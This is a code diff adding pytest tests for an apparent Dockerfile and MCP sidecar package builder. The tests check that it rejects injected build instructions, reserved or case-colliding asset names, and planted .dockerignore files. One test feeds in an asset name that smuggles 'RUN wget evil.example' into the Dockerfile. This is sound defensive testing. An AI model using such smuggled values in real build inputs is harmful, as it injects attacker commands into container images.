@@ -785,3 +785,73 @@ def test_op_registry_module_requires_matching_runtime_asset(tmp_path: Path):
             runtime_assets=(RuntimeAsset("scenario.json", evidence),),
         )
     assert not pkg.exists()
+
+
+def test_dockerfile_renderer_rejects_instruction_injection(tmp_path: Path):
+    dummy = tmp_path / "dummy.py"
+    dummy.write_text("x\n", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="control characters|confined POSIX"):
+        render_mcp_sidecar_dockerfile(
+            runtime_assets=(RuntimeAsset("ops.py\nRUN wget evil.example", dummy),)
+        )
+
+
+def test_runtime_asset_rejects_dockerignore_and_casefold_collisions(tmp_path: Path):
+    payload = tmp_path / "payload.bin"
+    payload.write_bytes(b"x")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="reserved"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset(".dockerignore", payload),),
+        )
+    with pytest.raises(SubstrateError, match="reserved"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg / "case",
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset("Server.py", payload),),
+        )
+    first = tmp_path / "a.py"
+    second = tmp_path / "b.py"
+    first.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    second.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="Duplicate"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg / "dup",
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(
+                RuntimeAsset("ops.py", first),
+                RuntimeAsset("OPS.py", second),
+            ),
+        )
+
+
+def test_plan_only_removes_stale_dockerfile(tmp_path: Path):
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "Dockerfile").write_text("FROM scratch\n", encoding="utf-8")
+    (pkg / "wheelhouse").mkdir()
+    (pkg / "wheelhouse" / "stale.whl").write_bytes(b"nope")
+    materialize_mcp_sidecar_package(
+        target_dir=pkg,
+        tools=[_runtime_asset_tool()],
+        plan_only=True,
+    )
+    assert not (pkg / "Dockerfile").exists()
+    assert not (pkg / "wheelhouse").exists()
+
+
+def test_materialize_rejects_planted_dockerignore(tmp_path: Path):
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / ".dockerignore").write_text("*\n", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="dockerignore"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+        )
